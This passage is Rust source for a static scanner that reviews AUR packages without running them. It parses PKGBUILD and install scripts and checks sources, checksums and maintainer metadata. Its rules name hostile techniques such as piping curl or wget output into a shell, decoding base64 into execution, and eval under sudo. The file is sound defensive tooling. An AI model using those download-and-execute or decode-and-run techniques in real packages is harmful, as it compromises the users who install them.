//! Static security scan of an AUR package repository (PKGBUILD, install
//! scripts, helper scripts, .SRCINFO) plus the package's AUR metadata.
//! Nothing is executed: shell files go through a small quote-aware parser.

use std::collections::BTreeSet;

use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
pub enum Severity {
    Info,
    Warning,
    Critical,
}

impl Severity {
    pub fn label(self) -> &'static str {
        match self {
            Self::Info => "Info",
            Self::Warning => "Warning",
            Self::Critical => "Critical",
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Finding {
    pub severity: Severity,
    /// Stable rule id, e.g. "pipe-to-shell".
    pub rule: String,
    /// Human sentence, e.g. "Downloads a script and pipes it into a shell".
    pub title: String,
    /// Repo-relative file ("PKGBUILD", "foo.install", ".SRCINFO"); "AUR" for metadata findings.
    pub file: String,
    /// 1-based line; None for metadata findings.
    pub line: Option<usize>,
    /// Trimmed source line (truncated to 160 chars) or metadata detail.
    pub excerpt: String,
}

/// One file of the package's AUR git repository.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct RepoFile {
    pub path: String,
    pub text: String,
}

/// AUR RPC metadata of the package base at review time.
#[derive(Debug, Clone, Default, PartialEq)]
pub struct Meta {
    pub maintainer: Option<String>,
    pub votes: u32,
    pub popularity: f64,
    /// Unix seconds when the package was flagged out of date.
    pub out_of_date: Option<i64>,
    /// Unix seconds.
    pub first_submitted: i64,
}

/// What was recorded when the user last approved this package base (None = never approved).
#[derive(Debug, Clone, Default, PartialEq, Serialize, Deserialize)]
pub struct Previous {
    pub maintainer: Option<String>,
    pub source_hosts: Vec<String>,
}

const DAY: i64 = 86_400;
/// Packages younger than this get a `new-package` warning.
const NEW_PACKAGE_DAYS: i64 = 14;
const EXCERPT_CHARS: usize = 160;
/// Minimum length of a base64-looking token to count as an embedded blob.
const OBFUSCATED_MIN: usize = 100;
/// Minimum run of `\xNN` escapes in printf/echo arguments.
const HEX_RUN_MIN: usize = 8;
const CHECKSUM_ALGS: &[&str] = &[
    "md5", "sha1", "sha224", "sha256", "sha384", "sha512", "b2", "ck",
];

/// Scan a package repository and its AUR metadata. Findings are sorted by
/// severity (most severe first), then file, then line.
pub fn scan(
    files: &[RepoFile],
    meta: &Meta,
    previous: Option<&Previous>,
    now: i64,
) -> Vec<Finding> {
    let mut out = Vec::new();
    let mut hosts = Vec::new();
    for file in files {
        let name = file.path.rsplit('/').next().unwrap_or(&file.path);
        if name == ".SRCINFO" {
            scan_srcinfo(file, &mut out);
            hosts = source_hosts(&file.text);
        } else if let Some(kind) = Kind::of(name) {
            let pipes = parse_shell(&file.text);
            let mut cx = Ctx {
                file: &file.path,
                lines: file.text.lines().collect(),
                kind,
                out: &mut out,
            };
            for p in &pipes {
                cx.pipeline(p);
            }
        }
    }
    scan_meta(meta, previous, &hosts, now, &mut out);
    finish(out)
}

/// Hosts of all remote `source*` entries in a .SRCINFO (lowercased, deduped, sorted).
pub fn source_hosts(srcinfo: &str) -> Vec<String> {
    let hosts: BTreeSet<String> = srcinfo_base(srcinfo)
        .into_iter()
        .filter(|e| is_source_key(e.key))
        .filter_map(|e| Source::parse(e.value))
        .filter(|s| s.remote())
        .filter_map(|s| s.host())
        .collect();
    hosts.into_iter().collect()
}

pub fn max_severity(findings: &[Finding]) -> Option<Severity> {
    findings.iter().map(|f| f.severity).max()
}

/// Drop warnings already explained by a critical exec finding on the same line,
/// remove duplicates and sort.
fn finish(mut out: Vec<Finding>) -> Vec<Finding> {
    let exec_lines: BTreeSet<(String, Option<usize>)> = out
        .iter()
        .filter(|f| matches!(f.rule.as_str(), "pipe-to-shell" | "decode-exec"))
        .map(|f| (f.file.clone(), f.line))
        .collect();
    out.retain(|f| {
        !(matches!(f.rule.as_str(), "eval" | "decode")
            && exec_lines.contains(&(f.file.clone(), f.line)))
    });
    out.sort_by(|a, b| {
        b.severity
            .cmp(&a.severity)
            .then_with(|| a.file.cmp(&b.file))
            .then(a.line.cmp(&b.line))
            .then_with(|| a.rule.cmp(&b.rule))
            .then_with(|| a.title.cmp(&b.title))
    });
    out.dedup();
    out
}

fn excerpt(s: &str) -> String {
    let s = s.trim();
    if s.chars().count() > EXCERPT_CHARS {
        let mut t: String = s.chars().take(EXCERPT_CHARS - 1).collect();
        t.push('…');
        t
    } else {
        s.to_string()
    }
}

// ---------------------------------------------------------------------------
// Metadata

fn scan_meta(
    meta: &Meta,
    previous: Option<&Previous>,
    hosts: &[String],
    now: i64,
    out: &mut Vec<Finding>,
) {
    let mut push = |severity, rule: &str, title: &str, excerpt: String| {
        out.push(Finding {
            severity,
            rule: rule.into(),
            title: title.into(),
            file: "AUR".into(),
            line: None,
            excerpt,
        });
    };
    if let Some(prev) = previous {
        let new: Vec<&str> = hosts
            .iter()
            .filter(|h| !prev.source_hosts.contains(h))
            .map(String::as_str)
            .collect();
        if !new.is_empty() {
            push(
                Severity::Warning,
                "source-host-changed",
                "Sources are downloaded from hosts not seen at the last approval",
                format!("New hosts: {}", new.join(", ")),
            );
        }
        if meta.maintainer.is_some() && meta.maintainer != prev.maintainer {
            push(
                Severity::Warning,
                "maintainer-changed",
                "Maintainer changed since the last approval",
                format!(
                    "{} → {}",
                    prev.maintainer.as_deref().unwrap_or("none"),
                    meta.maintainer.as_deref().unwrap_or("none")
                ),
            );
        }
    }
    if meta.maintainer.is_none() {
        push(
            Severity::Warning,
            "orphaned",
            "Package is orphaned (no maintainer)",
            "No maintainer".into(),
        );
    }
    if now - meta.first_submitted < NEW_PACKAGE_DAYS * DAY {
        push(
            Severity::Warning,
            "new-package",
            "Package was first submitted less than 14 days ago",
            format!("First submitted {}", ymd(meta.first_submitted)),
        );
    }
    if meta.votes < 10 && meta.popularity < 0.5 {
        push(
            Severity::Info,
            "low-popularity",
            "Package has few votes and low popularity",
            format!("{} votes, popularity {:.2}", meta.votes, meta.popularity),
        );
    }
    if let Some(ts) = meta.out_of_date {
        push(
            Severity::Info,
            "out-of-date",
            "Package is flagged out of date",
            format!("Flagged out of date on {}", ymd(ts)),
        );
    }
}

/// `YYYY-MM-DD` (UTC) of Unix seconds (Howard Hinnant's civil_from_days).
fn ymd(ts: i64) -> String {
    let z = ts.div_euclid(DAY) + 719_468;
    let era = z.div_euclid(146_097);
    let doe = z.rem_euclid(146_097);
    let yoe = (doe - doe / 1460 + doe / 36_524 - doe / 146_096) / 365;
    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
    let mp = (5 * doy + 2) / 153;
    let d = doy - (153 * mp + 2) / 5 + 1;
    let m = if mp < 10 { mp + 3 } else { mp - 9 };
    let y = yoe + era * 400 + i64::from(m <= 2);
    format!("{y:04}-{m:02}-{d:02}")
}

// ---------------------------------------------------------------------------
// .SRCINFO

struct Entry<'a> {
    line: usize,
    key: &'a str,
    value: &'a str,
}

/// `key = value` entries of the pkgbase section (sources and checksums only live there).
fn srcinfo_base(text: &str) -> Vec<Entry<'_>> {
    let mut entries = Vec::new();
    for (i, raw) in text.lines().enumerate() {
        let Some((key, value)) = raw.trim().split_once('=') else {
            continue;
        };
        let key = key.trim();
        if key == "pkgname" {
            break;
        }
        entries.push(Entry {
            line: i + 1,
            key,
            value: value.trim(),
        });
    }
    entries
}

fn is_source_key(key: &str) -> bool {
    key == "source" || key.starts_with("source_")
}

/// A `source` entry split into its parts: `[name::][vcs+]scheme://rest`.
struct Source<'a> {
    /// Local file name given with `name::`.
    name: Option<&'a str>,
    vcs: Option<&'a str>,
    scheme: &'a str,
    rest: &'a str,
}

impl<'a> Source<'a> {
    /// None for local files.
    fn parse(value: &'a str) -> Option<Self> {
        let sep = value.find("://")?;
        let (name, url) = match value.find("::") {
            Some(i) if i < sep => (Some(&value[..i]), &value[i + 2..]),
            _ => (None, value),
        };
        let (full, rest) = url.split_once("://")?;
        let (vcs, scheme) = match full.split_once('+') {
            Some((vcs, scheme)) => (Some(vcs), scheme),
            None => (None, full),
        };
        Some(Self {
            name,
            vcs,
            scheme,
            rest,
        })
    }

    fn remote(&self) -> bool {
        !self.scheme.eq_ignore_ascii_case("file")
    }

    fn is_vcs(&self) -> bool {
        self.vcs
            .is_some_and(|v| matches!(v, "git" | "svn" | "hg" | "bzr" | "fossil"))
            || matches!(self.scheme, "git" | "svn" | "bzr")
    }

    fn insecure(&self) -> bool {
        matches!(self.scheme, "http" | "ftp" | "git" | "svn" | "bzr")
    }

    /// makepkg recognises signatures by the local file name.
    fn signature(&self) -> bool {
        let file = match self.name {
            Some(name) => name.to_ascii_lowercase(),
            None => self
                .rest
                .split(['?', '#'])
                .next()
                .unwrap_or("")
                .to_ascii_lowercase(),
        };
        [".sig", ".asc", ".sign"]
            .iter()
            .any(|ext| file.ends_with(ext))
    }

    fn host(&self) -> Option<String> {
        let authority = self.rest.split(['/', '?', '#']).next()?;
        let host = authority.rsplit_once('@').map_or(authority, |(_, h)| h);
        let host = match host.strip_prefix('[') {
            Some(v6) => &host[..v6.find(']').map_or(host.len(), |i| i + 2)],
            None => host.split(':').next().unwrap_or(host),
        };
        (!host.is_empty()).then(|| host.to_ascii_lowercase())
    }
}

fn scan_srcinfo(file: &RepoFile, out: &mut Vec<Finding>) {
    let lines: Vec<&str> = file.text.lines().collect();
    let entries = srcinfo_base(&file.text);
    let mut push = |rule: &str, title: &str, line: usize| {
        out.push(Finding {
            severity: Severity::Warning,
            rule: rule.into(),
            title: title.into(),
            file: file.path.clone(),
            line: Some(line),
            excerpt: excerpt(lines[line - 1]),
        });
    };
    let mut seen: Vec<(&str, usize)> = Vec::new();
    for e in entries.iter().filter(|e| is_source_key(e.key)) {
        let idx = match seen.iter_mut().find(|(k, _)| *k == e.key) {
            Some((_, n)) => {
                *n += 1;
                *n - 1
            }
            None => {
                seen.push((e.key, 1));
                0
            }
        };
        let Some(src) = Source::parse(e.value) else {
            continue;
        };
        if !src.remote() {
            continue;
        }
        if src.insecure() {
            push(
                "insecure-source",
                "Downloads a source over an unencrypted connection",
                e.line,
            );
        }
        if src.is_vcs() || src.signature() {
            continue;
        }
        let suffix = &e.key["source".len()..];
        let sums: Vec<Option<&str>> = CHECKSUM_ALGS
            .iter()
            .filter_map(|alg| {
                let key = format!("{alg}sums{suffix}");
                let values: Vec<&str> = entries
                    .iter()
                    .filter(|x| x.key == key)
                    .map(|x| x.value)
                    .collect();
                (!values.is_empty()).then(|| values.get(idx).copied())
            })
            .collect();
        if !sums.is_empty() && sums.iter().all(|v| *v == Some("SKIP")) {
            push(
                "skip-checksum",
                "Skips the checksum of a downloaded source",
                e.line,
            );
        }
    }
}

// ---------------------------------------------------------------------------
// Shell parsing

#[derive(Debug, Default)]
struct Word {
    /// Quotes removed; `$(…)`/backticks replaced by `$()`, `${…}` kept verbatim.
    text: String,
    /// Contained quotes, escapes or substitutions (cannot be a keyword).
    quoted: bool,
    line: usize,
    /// Command and process substitutions inside the word.
    subs: Vec<Pipeline>,
}

#[derive(Debug)]
struct Redir {
    output: bool,
    target: Word,
}

#[derive(Debug, Default)]
struct Cmd {
    words: Vec<Word>,
    redirs: Vec<Redir>,
    line: usize,
    /// Array assignment `name=(…)`; `words` are the elements.
    array: Option<String>,
}

impl Cmd {
    fn is_empty(&self) -> bool {
        self.words.is_empty() && self.redirs.is_empty()
    }

    fn all_words(&self) -> impl Iterator<Item = &Word> + Clone {
        self.words
            .iter()
            .chain(self.redirs.iter().map(|r| &r.target))
    }
}

#[derive(Debug)]
struct Pipeline {
    stages: Vec<Cmd>,
    /// Enclosing shell function, None at top level.
    func: Option<String>,
}

#[derive(Clone, Copy, PartialEq, Eq)]
enum End {
    Eof,
    Paren,
    Backtick,
}

struct Parser {
    s: Vec<char>,
    i: usize,
    line: usize,
    backticks: usize,
    /// Heredocs started on the current line: (delimiter, strip leading tabs).
    heredocs: Vec<(String, bool)>,
    /// Heredoc body lines: (line, text, enclosing function).
    bodies: Vec<(usize, String, Option<String>)>,
    braces: usize,
    /// Open functions with the brace depth of their body.
    funcs: Vec<(String, usize)>,
    pending_func: Option<String>,
}

/// Parse a whole shell file. Heredoc bodies are parsed line by line so stray
/// quotes in their text cannot swallow the rest of the file.
fn parse_shell(text: &str) -> Vec<Pipeline> {
    let mut p = Parser::new(text, 1, None);
    let mut pipes = p.seq(End::Eof);
    for (line, body, func) in std::mem::take(&mut p.bodies) {
        pipes.extend(Parser::new(&body, line, func).seq(End::Eof));
    }
    pipes
}

impl Parser {
    fn new(text: &str, line: usize, func: Option<String>) -> Self {
        Self {
            s: text.chars().collect(),
            i: 0,
            line,
            backticks: 0,
            heredocs: Vec::new(),
            bodies: Vec::new(),
            braces: 0,
            funcs: func.into_iter().map(|f| (f, 0)).collect(),
            pending_func: None,
        }
    }

    fn peek(&self) -> Option<char> {
        self.s.get(self.i).copied()
    }

    fn at(&self, k: usize) -> Option<char> {
        self.s.get(self.i + k).copied()
    }

    fn bump(&mut self) -> Option<char> {
        let c = self.peek()?;
        self.i += 1;
        if c == '\n' {
            self.line += 1;
        }
        Some(c)
    }

    fn skip_blanks(&mut self) {
        while matches!(self.peek(), Some(' ' | '\t' | '\r')) {
            self.i += 1;
        }
    }

    fn skip_comment(&mut self) {
        while self.peek().is_some_and(|c| c != '\n') {
            self.i += 1;
        }
    }

    fn func(&self) -> Option<String> {
        self.funcs.last().map(|f| f.0.clone())
    }

    fn end_cmd(stages: &mut Vec<Cmd>, cmd: &mut Cmd) {
        if !cmd.is_empty() {
            stages.push(std::mem::take(cmd));
        }
    }

    fn end_pipeline(&self, pipes: &mut Vec<Pipeline>, stages: &mut Vec<Cmd>, cmd: &mut Cmd) {
        Self::end_cmd(stages, cmd);
        if !stages.is_empty() {
            pipes.push(Pipeline {
                stages: std::mem::take(stages),
                func: self.func(),
            });
        }
    }

    /// Parse commands until `end` (or end of input).
    fn seq(&mut self, end: End) -> Vec<Pipeline> {
        if end == End::Backtick {
            self.backticks += 1;
        }
        let mut pipes = Vec::new();
        let mut stages = Vec::new();
        let mut cmd = Cmd::default();
        let mut depth = 0usize;
        while let Some(c) = self.peek() {
            match c {
                ' ' | '\t' | '\r' => self.i += 1,
                '#' => self.skip_comment(),
                '\\' if self.at(1) == Some('\n') => {
                    self.bump();
                    self.bump();
                }
                '\n' => {
                    self.bump();
                    self.end_pipeline(&mut pipes, &mut stages, &mut cmd);
                    self.read_heredocs();
                }
                ';' => {
                    self.i += 1;
                    self.end_pipeline(&mut pipes, &mut stages, &mut cmd);
                }
                '&' if self.at(1) == Some('>') => {
                    self.i += 1;
                    self.redirect(&mut cmd);
                }
                '&' => {
                    self.i += if self.at(1) == Some('&') { 2 } else { 1 };
                    self.end_pipeline(&mut pipes, &mut stages, &mut cmd);
                }
                '|' if self.at(1) == Some('|') => {
                    self.i += 2;
                    self.end_pipeline(&mut pipes, &mut stages, &mut cmd);
                }
                '|' => {
                    self.i += if self.at(1) == Some('&') { 2 } else { 1 };
                    Self::end_cmd(&mut stages, &mut cmd);
                }
                '(' => {
                    let mut j = self.i + 1;
                    while matches!(self.s.get(j), Some(' ' | '\t')) {
                        j += 1;
                    }
                    let def = self.s.get(j) == Some(&')')
                        && stages.is_empty()
                        && cmd.redirs.is_empty()
                        && cmd.words.len() == 1
                        && !cmd.words[0].quoted;
                    if def {
                        self.pending_func = Some(std::mem::take(&mut cmd).words.remove(0).text);
                        self.i = j + 1;
                    } else {
                        self.i += 1;
                        depth += 1;
                        self.end_pipeline(&mut pipes, &mut stages, &mut cmd);
                    }
                }
                ')' => {
                    self.i += 1;
                    if depth > 0 {
                        depth -= 1;
                        Self::end_cmd(&mut stages, &mut cmd);
                    } else if end == End::Paren {
                        break;
                    } else {
                        self.end_pipeline(&mut pipes, &mut stages, &mut cmd);
                    }
                }
                '`' if end == End::Backtick => {
                    self.i += 1;
                    break;
                }
                '<' | '>' if self.at(1) != Some('(') => self.redirect(&mut cmd),
                '0'..='9' if self.fd_redirect() => self.redirect(&mut cmd),
                _ => {
                    let start = self.i;
                    let word = self.word();
                    if self.i == start {
                        self.bump();
                    } else if self.peek() == Some('(') && assignment_name(&word.text).is_some() {
                        self.i += 1;
                        self.end_pipeline(&mut pipes, &mut stages, &mut cmd);
                        let name = assignment_name(&word.text).unwrap_or_default().to_string();
                        let words = self.array();
                        let array = Cmd {
                            words,
                            redirs: Vec::new(),
                            line: word.line,
                            array: Some(name),
                        };
                        pipes.push(Pipeline {
                            stages: vec![array],
                            func: self.func(),
                        });
                    } else if !(cmd.is_empty() && !word.quoted && self.keyword(&word.text)) {
                        if cmd.is_empty() {
                            cmd.line = word.line;
                        }
                        cmd.words.push(word);
                    }
                }
            }
        }
        self.end_pipeline(&mut pipes, &mut stages, &mut cmd);
        if end == End::Backtick {
            self.backticks -= 1;
        }
        pipes
    }

    /// Handle a reserved word at command position; false if `text` is not one.
    fn keyword(&mut self, text: &str) -> bool {
        match text {
            "{" => {
                self.braces += 1;
                if let Some(name) = self.pending_func.take() {
                    self.funcs.push((name, self.braces));
                }
            }
            "}" => {
                if self.funcs.last().is_some_and(|f| f.1 == self.braces) {
                    self.funcs.pop();
                }
                self.braces = self.braces.saturating_sub(1);
            }
            "function" => {
                self.skip_blanks();
                let name = self.word();
                self.pending_func = Some(name.text);
                self.skip_blanks();
                if self.peek() == Some('(') {
                    let mut j = self.i + 1;
                    while matches!(self.s.get(j), Some(' ' | '\t')) {
                        j += 1;
                    }
                    if self.s.get(j) == Some(&')') {
                        self.i = j + 1;
                    }
                }
            }
            "then" | "do" | "else" | "elif" | "if" | "while" | "until" | "!" | "time" | "fi"
            | "done" | "esac" => {}
            _ => return false,
        }
        true
    }

    /// Digits directly followed by a redirection operator (`2>`, `1>>`).
    fn fd_redirect(&self) -> bool {
        let mut j = self.i;
        while self.s.get(j).is_some_and(char::is_ascii_digit) {
            j += 1;
        }
        matches!(self.s.get(j), Some('<' | '>')) && self.s.get(j + 1) != Some(&'(')
    }

    /// Parse a redirection starting at its operator (fd digits are skipped).
    fn redirect(&mut self, cmd: &mut Cmd) {
        while self.peek().is_some_and(|c| c.is_ascii_digit()) {
            self.i += 1;
        }
        let line = self.line;
        let output = self.peek() == Some('>');
        self.i += 1;
        if !output && self.peek() == Some('<') {
            self.i += 1;
            if self.peek() == Some('<') {
                self.i += 1;
            } else {
                let strip = self.peek() == Some('-');
                if strip {
                    self.i += 1;
                }
                self.skip_blanks();
                let delim = self.word();
                self.heredocs.push((delim.text, strip));
                return;
            }
        } else if matches!(self.peek(), Some('>' | '|')) {
            self.i += 1;
        }
        if self.peek() == Some('&') {
            // fd duplication (`>&2`, `<&0`).
            self.i += 1;
            self.skip_blanks();
            self.word();
            return;
        }
        self.skip_blanks();
        let target = self.word();
        if cmd.is_empty() {
            cmd.line = line;
        }
        cmd.redirs.push(Redir { output, target });
    }

    /// Consume heredoc bodies that start after the line just ended.
    fn read_heredocs(&mut self) {
        for (delim, strip) in std::mem::take(&mut self.heredocs) {
            while self.peek().is_some() {
                let start = self.i;
                let line = self.line;
                self.skip_comment();
                let text: String = self.s[start..self.i].iter().collect();
                self.bump();
                let text = text.trim_end_matches('\r');
                let cmp = if strip {
                    text.trim_start_matches('\t')
                } else {
                    text
                };
                if cmp == delim {
                    break;
                }
                self.bodies.push((line, text.to_string(), self.func()));
            }
        }
    }

    /// Elements of an array assignment, after the opening paren.
    fn array(&mut self) -> Vec<Word> {
        let mut words = Vec::new();
        while let Some(c) = self.peek() {
            match c {
                ')' => {
                    self.i += 1;
                    break;
                }
                ' ' | '\t' | '\r' | '\n' => {
                    self.bump();
                }
                '#' => self.skip_comment(),
                '\\' if self.at(1) == Some('\n') => {
                    self.bump();
                    self.bump();
                }
                _ => {
                    let start = self.i;
                    let word = self.word();
                    if self.i == start {
                        self.bump();
                    } else {
                        words.push(word);
                    }
                }
            }
        }
        words
    }

    fn word(&mut self) -> Word {
        let mut w = Word {
            line: self.line,
            ..Word::default()
        };
        if matches!(self.peek(), Some('<' | '>')) && self.at(1) == Some('(') {
            self.i += 2;
            w.quoted = true;
            w.text.push_str("<()");
            w.subs = self.seq(End::Paren);
            return w;
        }
        while let Some(c) = self.peek() {
            match c {
                ' ' | '\t' | '\r' | '\n' | ';' | '&' | '|' | '(' | ')' | '<' | '>' => break,
                '`' if self.backticks > 0 => break,
                '`' => {
                    self.i += 1;
                    w.quoted = true;
                    w.text.push_str("$()");
                    let sub = self.seq(End::Backtick);
                    w.subs.extend(sub);
                }
                '\'' => {
                    self.i += 1;
                    w.quoted = true;
                    while let Some(c) = self.bump() {
                        if c == '\'' {
                            break;
                        }
                        w.text.push(c);
                    }
                }
                '"' => {
                    self.i += 1;
                    w.quoted = true;
                    self.dquote(&mut w);
                }
                '\\' => {
                    self.i += 1;
                    if let Some(c) = self.bump()
                        && c != '\n'
                    {
                        w.quoted = true;
                        w.text.push(c);
                    }
                }
                '$' => self.dollar(&mut w, false),
                _ => {
                    self.i += 1;
                    w.text.push(c);
                }
            }
        }
        w
    }

    /// Body of a double-quoted string, after the opening quote.
    fn dquote(&mut self, w: &mut Word) {
        while let Some(c) = self.peek() {
            match c {
                '"' => {
                    self.i += 1;
                    return;
                }
                '\\' => {
                    self.i += 1;
                    match self.bump() {
                        Some(c @ ('$' | '`' | '"' | '\\')) => w.text.push(c),
                        Some('\n') | None => {}
                        Some(c) => {
                            w.text.push('\\');
                            w.text.push(c);
                        }
                    }
                }
                '$' => self.dollar(w, true),
                '`' if self.backticks == 0 => {
                    self.i += 1;
                    w.text.push_str("$()");
                    let sub = self.seq(End::Backtick);
                    w.subs.extend(sub);
                }
                _ => {
                    self.bump();
                    w.text.push(c);
                }
            }
        }
    }

    /// Expansion starting at `$`.
    fn dollar(&mut self, w: &mut Word, in_dquote: bool) {
        match self.at(1) {
            Some('(') if self.at(2) == Some('(') => {
                w.text.push_str("$((");
                self.i += 3;
                let mut depth = 2usize;
                while let Some(c) = self.bump() {
                    w.text.push(c);
                    match c {
                        '(' => depth += 1,
                        ')' => {
                            depth -= 1;
                            if depth == 0 {
                                break;
                            }
                        }
                        _ => {}
                    }
                }
            }
            Some('(') => {
                self.i += 2;
                w.quoted = true;
                w.text.push_str("$()");
                let sub = self.seq(End::Paren);
                w.subs.extend(sub);
            }
            Some('{') => {
                w.text.push_str("${");
                self.i += 2;
                let mut depth = 1usize;
                while let Some(c) = self.bump() {
                    w.text.push(c);
                    match c {
                        '{' => depth += 1,
                        '}' => {
                            depth -= 1;
                            if depth == 0 {
                                break;
                            }
                        }
                        _ => {}
                    }
                }
            }
            Some('\'') if !in_dquote => {
                self.i += 2;
                w.quoted = true;
                while let Some(c) = self.bump() {
                    match c {
                        '\'' => break,
                        '\\' => {
                            w.text.push('\\');
                            if let Some(c) = self.bump() {
                                w.text.push(c);
                            }
                        }
                        _ => w.text.push(c),
                    }
                }
            }
            // `$"…"` is a locale string; the caller handles the quote.
            Some('"') if !in_dquote => self.i += 1,
            _ => {
                self.i += 1;
                w.text.push('$');
            }
        }
    }
}

/// Variable name of an assignment word (`name=…`, `name+=…`).
fn assignment_name(text: &str) -> Option<&str> {
    let (name, _) = text.split_once('=')?;
    let name = name.strip_suffix('+').unwrap_or(name);
    let mut chars = name.chars();
    let first = chars.next()?;
    ((first.is_ascii_alphabetic() || first == '_')
        && chars.all(|c| c.is_ascii_alphanumeric() || c == '_'))
    .then_some(name)
}

fn is_checksum_name(name: &str) -> bool {
    let base = name.split_once('_').map_or(name, |(b, _)| b);
    base.strip_suffix("sums")
        .is_some_and(|alg| CHECKSUM_ALGS.contains(&alg))
}

// ---------------------------------------------------------------------------
// Shell analysis

#[derive(Clone, Copy, PartialEq, Eq)]
enum Kind {
    Pkgbuild,
    Install,
    Script,
}

impl Kind {
    fn of(name: &str) -> Option<Self> {
        if name == "PKGBUILD" {
            Some(Self::Pkgbuild)
        } else if name.ends_with(".install") {
            Some(Self::Install)
        } else if name.ends_with(".sh") {
            Some(Self::Script)
        } else {
            None
        }
    }
}

/// A command with assignments and wrappers (`env`, `sudo`, `nice`…) skipped.
struct Resolved<'a> {
    name: &'a str,
    args: &'a [Word],
    /// Privilege wrapper the command runs under (`sudo`, `doas`, `pkexec`).
    privileged: Option<&'a str>,
}

fn basename(text: &str) -> &str {
    text.rsplit('/').next().unwrap_or(text)
}

fn resolve(cmd: &Cmd) -> Resolved<'_> {
    let w = &cmd.words;
    let mut privileged = None;
    if cmd.array.is_some() {
        return Resolved {
            name: "",
            args: &[],
            privileged,
        };
    }
    let mut k = 0;
    while k < w.len() && assignment_name(&w[k].text).is_some() {
        k += 1;
    }
    while k < w.len() {
        let name = basename(&w[k].text);
        let valued = match name {
            "sudo" => "CDghprRtTuU",
            "doas" => "uC",
            "env" => "uCS",
            "nice" => "n",
            "exec" => "a",
            "stdbuf" => "ioe",
            "pkexec" | "command" | "builtin" | "nohup" | "time" | "fakeroot" => "",
            _ => break,
        };
        if matches!(name, "sudo" | "doas" | "pkexec") {
            privileged.get_or_insert(name);
        }
        k += 1;
        while k < w.len() {
            let t = w[k].text.as_str();
            if t == "--" {
                k += 1;
                break;
            }
            if name == "env" && (t == "-" || assignment_name(t).is_some()) {
                k += 1;
                continue;
            }
            let Some(opts) = t.strip_prefix('-').filter(|o| !o.is_empty()) else {
                break;
            };
            k += 1;
            if let Some(long) = opts.strip_prefix('-') {
                if !long.contains('=')
                    && matches!(
                        long,
                        "user" | "chdir" | "unset" | "split-string" | "adjustment"
                    )
                {
                    k += 1;
                }
            } else if opts
                .find(|c| valued.contains(c))
                .is_some_and(|i| i + 1 == opts.len())
            {
                k += 1;
            }
        }
    }
    match w.get(k) {
        Some(cmd_word) => Resolved {
            name: basename(&cmd_word.text),
            args: &w[k + 1..],
            privileged,
        },
        None => Resolved {
            name: "",
            args: &[],
            privileged,
        },
    }
}

#[derive(Clone, Copy, PartialEq, Eq)]
enum Interp {
    Shell,
    Python,
    Perl,
}

fn interp(name: &str) -> Option<Interp> {
    match name {
        "sh" | "bash" | "zsh" | "dash" | "ksh" | "mksh" => Some(Interp::Shell),
        "perl" => Some(Interp::Perl),
        _ => name
            .strip_prefix("python")
            .filter(|v| v.chars().all(|c| c.is_ascii_digit() || c == '.'))
            .map(|_| Interp::Python),
    }
}

/// Interpreter (or `source /dev/stdin`) that executes code read from stdin.
fn runs_stdin(r: &Resolved) -> bool {
    let Some(kind) = interp(r.name) else {
        return matches!(r.name, "source" | ".")
            && r.args
                .first()
                .is_some_and(|a| matches!(a.text.as_str(), "/dev/stdin" | "/proc/self/fd/0"));
    };
    let inline = match kind {
        Interp::Shell => "c",
        Interp::Python => "cm",
        Interp::Perl => "eE",
    };
    for a in r.args {
        let t = a.text.as_str();
        if matches!(t, "-" | "--" | "-s") {
            return true;
        }
        match t.strip_prefix('-') {
            Some(opts) if !opts.starts_with('-') => {
                if opts.contains(|c| inline.contains(c)) {
                    return false;
                }
            }
            Some(_) => {}
            None => return false,
        }
    }
    true
}

fn is_downloader(r: &Resolved) -> bool {
    matches!(r.name, "curl" | "wget" | "fetch")
}

fn is_decoder(r: &Resolved) -> bool {
    let has = |flag: char, long: &str| {
        r.args.iter().any(|a| {
            let t = a.text.as_str();
            t == long
                || t.strip_prefix('-')
                    .is_some_and(|o| !o.starts_with('-') && o.contains(flag))
        })
    };
    match r.name {
        "base64" | "base32" | "basenc" => has('d', "--decode") || has('D', "--decode"),
        "xxd" => has('r', "--revert"),
        "openssl" => {
            r.args
                .first()
                .is_some_and(|a| matches!(a.text.as_str(), "enc" | "base64"))
                && r.args.iter().any(|a| a.text == "-d")
        }
        _ => false,
    }
}

/// Whether any command substitution inside `words` (recursively) matches `pred`.
fn subs_any<'a>(
    mut words: impl Iterator<Item = &'a Word>,
    pred: &dyn Fn(&Resolved) -> bool,
) -> bool {
    words.any(|w| {
        w.subs
            .iter()
            .flat_map(|p| &p.stages)
            .any(|c| pred(&resolve(c)) || subs_any(c.all_words(), pred))
    })
}

fn is_build_fn(name: &str) -> bool {
    matches!(name, "prepare" | "pkgver" | "build" | "check" | "package")
        || name.starts_with("package_")
}

/// Network access by a command.
fn is_network(r: &Resolved) -> bool {
    match r.name {
        "curl" | "wget" | "aria2c" => true,
        "git" => matches!(subcommand(r.args, "Cc"), Some("clone" | "fetch" | "pull")),
        "svn" => matches!(subcommand(r.args, ""), Some("checkout" | "co")),
        "hg" => subcommand(r.args, "R") == Some("clone"),
        _ => false,
    }
}

fn subcommand<'a>(args: &'a [Word], valued: &str) -> Option<&'a str> {
    let mut it = args.iter().map(|a| a.text.as_str());
    while let Some(t) = it.next() {
        if let Some(long) = t.strip_prefix("--") {
            if !long.contains('=')
                && matches!(
                    long,
                    "git-dir" | "work-tree" | "namespace" | "cwd" | "repository"
                )
            {
                it.next();
            }
        } else if let Some(opt) = t.strip_prefix('-') {
            if opt.len() == 1 && valued.contains(opt) {
                it.next();
            }
        } else {
            return Some(t);
        }
    }
    None
}

/// Parsed command-line options of coreutils-style commands.
#[derive(Default)]
struct Opts<'a> {
    operands: Vec<&'a str>,
    /// Short flags without values, plus long option names.
    flags: Vec<&'a str>,
    target: Option<&'a str>,
    mode: Option<&'a str>,
}

fn parse_opts<'a>(args: &'a [Word], valued: &str, long_valued: &[&str]) -> Opts<'a> {
    let mut o = Opts::default();
    let mut it = args.iter().map(|a| a.text.as_str());
    let mut only_operands = false;
    while let Some(t) = it.next() {
        if only_operands || t == "-" || !t.starts_with('-') {
            o.operands.push(t);
        } else if t == "--" {
            only_operands = true;
        } else if let Some(long) = t.strip_prefix("--") {
            let (name, value) = match long.split_once('=') {
                Some((n, v)) => (n, Some(v)),
                None if long_valued.contains(&long) => (long, it.next()),
                None => (long, None),
            };
            match name {
                "target-directory" => o.target = value,
